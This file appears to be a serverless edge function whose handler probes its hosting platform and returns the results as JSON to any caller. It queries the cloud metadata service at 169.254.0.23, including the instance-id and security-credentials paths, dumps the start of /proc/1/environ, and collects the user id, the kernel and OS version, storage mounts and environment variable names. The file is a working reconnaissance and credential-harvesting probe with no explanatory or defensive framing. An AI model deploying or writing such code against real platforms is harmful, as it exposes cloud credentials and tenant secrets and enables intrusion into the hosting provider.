export async function onRequest(context) {
  const out = {};
  const t = async (name, fn) => { try { out[name] = await fn(); } catch (e) { out[name] = 'ERR:' + String(e).slice(0, 250); } };
  const fs = () => import('node:fs');
  await t('metaRoot', async () => { const r = await fetch('http://169.254.0.23/latest/meta-data/', {signal: AbortSignal.timeout(3000)}); return {status: r.status, body: (await r.text()).slice(0, 200)}; });
  await t('metaIid', async () => { const r = await fetch('http://169.254.0.23/latest/meta-data/instance-id', {signal: AbortSignal.timeout(3000)}); return {status: r.status, body: (await r.text()).slice(0, 80)}; });
  await t('camCred', async () => { const r = await fetch('http://169.254.0.23/latest/meta-data/cam/security-credentials/', {signal: AbortSignal.timeout(3000)}); return {status: r.status, body: (await r.text()).slice(0, 200)}; });
  await t('proc1env', async () => (await fs()).readFileSync('/proc/1/environ', 'utf8').slice(0, 350));
  await t('uid', async () => { const s = (await fs()).readFileSync('/proc/self/status', 'utf8'); return (s.match(/Uid\t.*/g) || []).concat(s.match(/Groups\t.*/g) || []).join(' | '); });
  await t('osRelease', async () => (await fs()).readFileSync('/etc/os-release', 'utf8').split('\n')[0] + ' / ' + (await fs()).readFileSync('/proc/version', 'utf8').slice(0, 90));
  await t('cosMounts', async () => (await fs()).readFileSync('/proc/self/mounts', 'utf8').split('\n').filter(l => /cos|cfs|nfs|9\.|10\./.test(l)).slice(0, 6));
  await t('envKeys', async () => Object.keys(process.env).filter(k => !/token|key|secret|cred/i.test(k)).slice(0, 30));
  return new Response(JSON.stringify(out), { headers: { 'Content-Type': 'application/json' } });
}
